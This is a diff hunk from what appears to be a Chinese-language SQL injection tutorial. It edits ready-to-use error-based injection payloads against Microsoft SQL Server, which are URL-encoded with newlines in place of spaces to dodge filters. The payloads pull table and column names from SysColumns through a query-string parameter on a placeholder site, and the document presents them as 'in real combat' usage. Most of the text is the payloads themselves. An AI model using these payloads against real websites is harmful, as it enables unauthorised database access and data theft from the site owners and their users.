@@ -150,13 +150,13 @@ xxx.com?abc=a%27%0aand%0a1=(SELECT%0aname%2b%27,%27%0aFROM(SELECT%0aname%0afrom%
 ```
 成功返回表名
 
-注字段名的语句，table_name指的是表名
+注字段名的语句，table指的是注出来的表名
 ```html
 select name+',' from (SELECT Name FROM SysColumns WHERE id=Object_Id('table_name'))a FOR XML PATH('')
 ```
 那么运用到实战:
 ```html
-xxx.com?abc=a%27%0aand%0a1=(select%0aname%2b%27,%27%0afrom%0a(SELECT%0aName%0aFROM%0aSysColumns%0aWHERE%0aid=Object_Id(%27table_name%27))a%0afor%0axml%0apath(%27%27))%0aand%0a%271%27=%271
+xxx.com?abc=a%27%0aand%0a1=(select%0aname%2b%27,%27%0afrom%0a(SELECT%0aName%0aFROM%0aSysColumns%0aWHERE%0aid=Object_Id(%27table%27))a%0afor%0axml%0apath(%27%27))%0aand%0a%271%27=%271
 ```
 
 
